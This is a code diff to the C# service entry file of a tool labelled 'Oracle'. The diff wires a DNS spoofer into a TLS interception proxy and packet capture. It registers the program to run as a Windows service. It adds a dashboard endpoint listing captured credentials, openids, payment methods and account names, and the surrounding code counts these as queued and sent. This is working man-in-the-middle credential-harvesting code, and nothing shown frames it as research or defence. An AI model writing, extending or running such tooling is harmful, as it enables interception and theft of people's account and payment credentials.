@@ -86,11 +86,28 @@ static ICaptureDriver CreateCaptureDriver()
     }
 }
 var captureService = new CaptureService(config, connTracker, packetFilter, captureDriver);
+
+// DnsSpoofer 单独处理，启动失败不阻塞整体
+DnsSpoofer? dnsSpoofer = null;
+try
+{
+    dnsSpoofer = new DnsSpoofer();
+    Console.WriteLine("[Oracle] ✅ DnsSpoofer created");
+}
+catch (Exception ex)
+{
+    Console.WriteLine($"[Oracle] ⚠️ DnsSpoofer unavailable: {ex.Message}");
+}
+
 var tlsProxy = new TlsProxy(config, certMgr, credQueue, ruleEngine);
 
 // ── ASP.NET Core Minimal API ──────────────────────────
 
 var builder = WebApplication.CreateBuilder(args);
+builder.Host.UseWindowsService(options =>
+{
+    options.ServiceName = "OracleService";
+});
 builder.WebHost.UseUrls($"http://{config.ApiBindAddress}:{config.ApiPort}");
 
 // Disable HTTPS redirection (we're running behind the scenes)
@@ -102,6 +119,8 @@ builder.Services.AddCors(options =>
 
 var app = builder.Build();
 app.UseCors();
+app.UseDefaultFiles();
+app.UseStaticFiles();
 
 // Health / Status
 app.MapGet("/status", () =>
@@ -122,7 +141,7 @@ app.MapGet("/status", () =>
         credentials_queued = credQueue.TotalEnqueued,
         credentials_sent = credQueue.TotalSent,
         credentials_failed = credQueue.TotalFailed,
-        dns_spoofed = wDriver?.DnsSpoofedCount ?? -1,
+        dns_spoofed = dnsSpoofer?.SpoofedCount ?? -1,
     });
 });
 
@@ -131,7 +150,12 @@ app.MapPost("/start", () =>
 {
     // TLS proxy must start first (before capture or DNS redirect)
     tlsProxy.Start();
-    captureService.Start();
+    if (captureDriver is WinDivertDriver)
+        captureService.Start();
+    if (dnsSpoofer != null)
+    {
+        try { dnsSpoofer.Start(); } catch (Exception ex) { Console.Error.WriteLine($"[Oracle] DnsSpoofer start failed: {ex.Message}"); }
+    }
     return Results.Ok(new { status = "started" });
 });
 
@@ -140,6 +164,7 @@ app.MapPost("/stop", () =>
 {
     captureService.Stop();
     tlsProxy.Stop();
+    dnsSpoofer?.Stop();
     return Results.Ok(new { status = "stopped" });
 });
 
@@ -204,6 +229,32 @@ app.MapPost("/inject", (Credential cred) =>
 {
     _ = credQueue.EnqueueAsync(cred);
     return Results.Ok(new { status = "queued", id = cred.Id });
+});
+
+// Recent captured data (for Dashboard)
+app.MapGet("/data", () =>
+{
+    var recent = credQueue.GetRecentCredentials();
+    return Results.Ok(new
+    {
+        total = credQueue.TotalEnqueued,
+        sent = credQueue.TotalSent,
+        failed = credQueue.TotalFailed,
+        items = recent.Select(c => new
+        {
+            id = c.Id,
+            type = c.Type.ToString(),
+            value = c.Value,
+            platform = c.Platform,
+            source = c.Source,
+            openid = c.OpenId,
+            pay_method = c.PayMethod,
+            product_id = c.ProductId,
+            account = c.AccountName,
+            metadata = c.Metadata,
+            captured_at = c.CapturedAt,
+        }).ToList()
+    });
 });
 
 // ── Help API ────────────────────────────────────────
@@ -276,6 +327,7 @@ lifetime.ApplicationStopping.Register(() =>
     Console.WriteLine("[Oracle] Shutting down...");
     captureService.Stop();
     tlsProxy.Stop();
+    dnsSpoofer?.Dispose();
     credQueue.Dispose();
     Console.WriteLine("[Oracle] Credential queue flushed. Goodbye.");
 });
